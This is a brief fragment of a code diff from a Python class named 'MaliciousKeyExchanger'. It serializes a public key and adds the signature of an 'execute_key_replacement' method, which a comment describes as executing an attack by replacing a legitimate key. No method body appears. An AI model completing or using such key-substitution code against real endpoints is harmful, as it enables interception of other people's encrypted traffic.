@@ -23,4 +23,6 @@ class MaliciousKeyExchanger:
             encoding=serialization.Encoding.PEM,
             format=serialization.PublicFormat.SubjectPublicKeyInfo
         )
-    
+
+#Execute attack by replacing legitimate key
+    def execute_key_replacement(self, endpoint_url):
